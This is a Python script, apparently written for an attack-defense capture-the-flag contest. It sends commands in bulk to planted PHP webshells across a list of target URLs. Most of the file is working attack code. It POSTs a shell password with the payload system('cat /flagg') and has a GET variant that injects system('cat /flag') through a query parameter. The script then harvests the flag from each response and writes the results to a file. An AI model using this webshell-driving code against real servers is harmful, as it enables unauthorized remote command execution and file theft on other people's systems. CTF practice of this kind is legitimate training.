import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 配置参数
IP_RANGE = range(170, 252)
PORTS = [80]  # 可扩展常见Web端口
TIMEOUT = 3
THREADS = 20
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
QUESTION_ID = "90122"
PASSWD = "nima"


def get_flag(upload_url):
    """并发向每个木马url发送cmd，提取flag"""
    flag_dict = {}
    payload = {
        "pass": "nima",  # nima => db088d7fd61422d0dd9f2152fd550127
        "cmd": "system('cat /flagg');",
    }

    def attack_post(url):
        try:
            print(url)
            r = requests.post(url, data=payload, timeout=TIMEOUT)
            if r.status_code == 200:
                print(r.text)
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{url} found flag: {flag}")
                    return url, flag
                else:
                    logging.warning(f"{url} 200 but no flag")
                    return url, None
            else:
                logging.warning(f"{url} status {r.status_code}")
                return url, None
        except Exception as e:
            logging.error(f"{url} request failed: {e}")
            return url, None

    def attack_get(url):
        try:
            url = "http://" + url + ".php" + "?s=system('cat /flag')"
            r = requests.get(url=url, timeout=TIMEOUT)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{url} found flag: {flag}")
                    return url, flag
                else:
                    logging.warning(f"{url} 200 but no flag")
                    return url, None
            else:
                logging.warning(f"{url} status {r.status_code}")
                return url, None
        except Exception as e:
            logging.error(f"{url} request failed: {e}")
            return url, None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(attack_post, url): url for url in upload_url}
        for future in as_completed(futures):
            url, flag = future.result()  # 不管成功，失败都写入文件
            flag_dict[url] = flag

    # 写入结果文件
    with open("自动_flag.txt", "w", encoding="utf-8") as f:
        for url, flag in flag_dict.items():
            f.write(f"{url}: {flag}\n")
    return flag_dict


if __name__ == "__main__":
    upload_url = "url.txt"
    with open(upload_url, 'r', encoding='utf-8') as f:
        # 使用列表推导式配合 strip() 去除每行首尾空白符
        upload_url = [line.strip() for line in f.readlines()]
    flags = get_flag(upload_url)
